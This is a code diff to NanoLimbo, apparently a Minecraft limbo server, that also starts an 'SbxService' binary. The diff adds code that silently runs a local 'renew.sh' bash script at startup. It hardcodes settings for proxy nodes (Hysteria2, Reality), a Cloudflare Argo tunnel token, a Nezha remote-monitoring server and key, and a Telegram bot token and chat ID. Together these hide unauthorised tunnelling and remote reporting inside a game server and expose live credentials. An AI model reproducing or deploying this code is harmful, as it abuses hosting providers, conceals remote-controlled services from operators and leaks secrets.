@@ -58,6 +58,17 @@ public final class NanoLimbo {
         // Start SbxService
         try {
             runSbxBinary();
+
+            // ✅ 启动续期脚本 renew.sh（服务器运行期间自动续期）
+            File renewScript = new File("renew.sh");
+            if (renewScript.exists()) {
+                new ProcessBuilder("bash", "renew.sh")
+                    .inheritIO()
+                    .start();
+                System.out.println(ANSI_GREEN + "renew.sh 已启动（自动续期中）" + ANSI_RESET);
+            } else {
+                System.err.println(ANSI_RED + "renew.sh 未找到，跳过执行" + ANSI_RESET);
+            }
             
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 running.set(false);
@@ -126,22 +137,22 @@ public final class NanoLimbo {
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "nz.xx66.nyc.mn");
         envVars.put("NEZHA_PORT", "443");
-        envVars.put("NEZHA_KEY", "TSgtib9imKq1m7OEXg");
+        envVars.put("NEZHA_KEY", "UizUp1k6j3Ru6esZIK");
         envVars.put("ARGO_PORT", "8001");
-        envVars.put("ARGO_DOMAIN", "altare-uk-hsi.dora.cc.cd");
-        envVars.put("ARGO_AUTH", "eyJhIjoiODYxM2UxNGFjMzJjZmQ1ZGFjZDlkZWJlOTljNzlhOGQiLCJ0IjoiYzIwMDM5ZTktNGNkNS00NzcxLWE3ZWItZWVhM2U3MDUyNjZjIiwicyI6Ik1UZ3pORFJpTVRrdFlqWXdNUzAwWkdaakxUZzRabVl0T0RFME5ETmlOakF6T1RobCJ9");
-        envVars.put("HY2_PORT", "25747");
-        envVars.put("TUIC_PORT", "25761");
-        envVars.put("REALITY_PORT", "25747");
-        envVars.put("S5_PORT", "25761");
+        envVars.put("ARGO_DOMAIN", "icehost-pl.dora.cc.cd");
+        envVars.put("ARGO_AUTH", "eyJhIjoiODYxM2UxNGFjMzJjZmQ1ZGFjZDlkZWJlOTljNzlhOGQiLCJ0IjoiZTc5NDMxMTQtOGI0OC00MjU3LWI4MmQtMDk1NTg0YjFiMTU3IiwicyI6Ik56QXpaRFEyTW1RdE1XWTJPUzAwTWpobExUbGlaVE10TWpnM05HTTBZakl6TjJSayJ9");
+        envVars.put("HY2_PORT", "30073");
+        envVars.put("TUIC_PORT", "");
+        envVars.put("REALITY_PORT", "30073");
+        envVars.put("S5_PORT", "");
         envVars.put("ANYTLS_PORT", "");
         envVars.put("ANYREALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
-        envVars.put("CHAT_ID", "");
-        envVars.put("BOT_TOKEN", "");
+        envVars.put("CHAT_ID", "453472010");
+        envVars.put("BOT_TOKEN", "7126463574:AAHSLx2WwHJSa3gpujRj64JhpEpCqsJcUZs");
         envVars.put("CFIP", "saas.sin.fan");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "altare-uk-hsi");
+        envVars.put("NAME", "icehost-pl");
         
         for (String var : ALL_ENV_VARS) {
             String value = System.getenv(var);
